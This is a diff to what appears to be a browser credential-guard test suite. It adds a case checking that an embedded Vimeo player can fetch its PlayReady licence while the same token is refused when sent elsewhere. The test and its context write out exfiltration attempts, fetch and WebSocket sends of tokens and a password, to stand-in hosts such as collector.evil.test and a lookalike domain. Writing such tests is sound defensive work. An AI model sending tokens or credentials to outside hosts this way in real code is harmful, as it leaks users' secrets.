@@ -315,6 +315,25 @@ function makeHarness(options) {
     /credential guard/,
     'trusting Spotify\'s Fastly host does not trust every Fastly tenant');
 
+  /* An embedded Vimeo player without Widevine licenses through PlayReady; refusing its licence token showed
+     "Rights issue" instead of the video. */
+  const vimeoEmbed = makeHarness({
+    href: 'https://player.vimeo.com/video/76979871',
+    ancestorOrigins: ['https://iri-dev.github.io'],
+  });
+  const licenceToken = 'ExpressPlayToken=' + 'AQAAABJjYXBpLmV4cHJlc3NwbGF5LmNvbQ'.repeat(3);
+  await vimeoEmbed.sandbox.fetch('https://pr.service.expressplay.com/playready/RightsManager.asmx?' + licenceToken);
+  assert.strictEqual(vimeoEmbed.state.fetches.length, 1, 'an embedded player may fetch its DRM licence');
+  assert.strictEqual(vimeoEmbed.state.emits.length, 0, 'and the licence request is not reported as token exfiltration');
+  await assert.rejects(
+    vimeoEmbed.sandbox.fetch('https://collector.evil.test/rights?' + licenceToken),
+    /credential guard/,
+    'the same licence token sent anywhere else is still refused');
+  await assert.rejects(
+    vimeoEmbed.sandbox.fetch('https://expressplay.com.evil.test/rights?' + licenceToken),
+    /credential guard/,
+    'a lookalike of the licence service gains no trust');
+
   const ws = new frame.sandbox.WebSocket('wss://collector.evil.test/socket');
   ws.send('password=correct horse battery staple');
   assert.strictEqual(frame.state.websocketSends.length, 0, 'off-site WebSocket credential sends are blocked');
